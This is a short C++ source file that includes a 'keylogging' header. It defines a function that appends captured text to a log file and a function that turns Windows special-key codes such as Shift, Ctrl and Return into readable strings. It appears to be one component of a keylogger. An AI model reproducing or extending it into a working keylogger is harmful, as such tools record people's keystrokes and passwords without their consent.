#include "./headers/keylogging.hpp"

// Save data into log file
void saveData(std::string data)
{
    std::fstream log_file;

    /*
        - Open file
        - std::ios::app will make the new data ppaend to the file instead of erase file content and
        then write to it.
    */

    log_file.open(LOG_FILE, std::ios::app);

    /* Write data into log file */

    log_file << data;

    /* Close the file stream */

    log_file.close();
}

/* Translate special key int into a string */

std::string translateSpecialKey(int key)
{
    #if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    std::string result;
    #else
    //std::cout << fmt::format("{:#x}", key) << std::endl;
    auto result = fmt::format("{:#x}", key);
    #endif

    switch (key)
    {
        case VK_SPACE:
            result = "[SPACE]";
            break;

        case VK_RETURN:
            result = "\n";
            break;

        case VK_BACK:
            result = "\b";
            break;

        case VK_CAPITAL:
            result = "[CAPS_LOCK]";
            break;
        
        case VK_TAB:
            result = "[TAB]";
            break;

        case VK_SHIFT:
            result = "[SHIFT]";
            break;

        case VK_CONTROL:
            result = "[CTRL]";
            break;
        
        case VK_MENU:
            result = "[ALT]";
            break;

        default:
            break;
    }

    return result;
}